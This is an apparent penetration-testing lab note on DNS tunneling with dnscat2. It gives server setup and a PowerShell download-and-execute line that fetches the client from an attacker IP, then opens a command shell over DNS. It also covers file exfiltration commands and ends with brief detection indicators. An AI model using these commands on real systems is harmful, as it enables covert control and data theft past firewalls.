# DNS Tunneling (Bypassing Firewalls)
**Concept:** Encapsulating data inside standard DNS queries (A, TXT, CNAME records). 
**Scenario:** You are on a compromised internal host. The firewall blocks all outbound TCP traffic (no reverse shells). However, the host _can_ resolve domain names (e.g., `google.com`). 
**Mechanism:** The compromised host sends data as a subdomain request to a malicious DNS server you control (e.g., `secret_data.attacker.com`). Your server decodes the subdomain and sends a response back in the DNS TXT record.
## 1. Tooling: Dnscat2
**Role:** Creates an encrypted C2 channel over the DNS protocol. **Components:**
- **Server (Attacker):** Runs a custom authoritative DNS server.
- **Client (Victim):** A PowerShell script or binary that queries the server.
## 2. Setting Up the Server (Attacker)
**Prerequisite:** You usually need a domain name (e.g., `evil.com`) with an `NS` record pointing to your attacker IP. For lab environments, you can run it directly on IP/Port 53 without a real domain, but it's less stealthy.
```shell
# 1. Install Dependencies
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# 2. Start the Server
# --dns host: The IP the server listens on (Your IP)
# --dns port: Port 53 (Standard DNS)
# --domain: The domain you are simulating (or own)
# --no-cache: Prevent caching from breaking the tunnel
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

**Output:** The server will generate a **Pre-Shared Secret**. Copy this; you need it for the client.
```txt
New window created: 0
Secret: 0ec04a91cd1e963f8c03ca499d589d21
```
## 3. Setting Up the Client (Victim)
**Context:** We use the PowerShell client (`dnscat2.ps1`) because it runs in memory and doesn't require compiling binaries on the target.

**Attacker Side (Hosting the Script):**
```shell
# Clone the client repo
git clone https://github.com/lukebaggett/dnscat2-powershell.git
# Host it
python3 -m http.server 80
```

**Victim Side (PowerShell):**
```shell
# 1. Download and Import
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.18/dnscat2.ps1')

# 2. Connect
# -PreSharedSecret: The key generated by the server
# -Exec cmd: Spawns a command shell immediately
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
## 4. Interacting with the Session
**Context:** Once connected, the session appears in your `dnscat2` server console. It looks like a Metasploit session.
```shell
# 1. List active sessions
dnscat2> windows
0 :: main [active]
1 :: command session (DESKTOP-ABC)

# 2. Interact with the session
dnscat2> session -i 1

# 3. You are now in a pseudo-shell
# You can run standard commands, but expect HIGH LATENCY.
exec > whoami
```

**Key Commands:**
- `window` / `windows`: List active clients.
- `session -i <id>`: Interact with a client.
- `shell`: Spawn a standard shell.
- `download <remote> <local>`: Exfiltrate files (Slow but effective).
- `upload <local> <remote>`: Upload tools.
## 5. Detection & Mitigation
**Indicators of Compromise (IoC):**
- **High Volume of TXT Records:** Normal traffic is mostly A/AAAA records. Tunneling generates massive TXT/CNAME volume.
- **Long Subdomains:** Queries like `encodeddatachunk12345.attacker.com` are suspicious.
- **High Frequency:** A heartbeat connection sends queries every few seconds.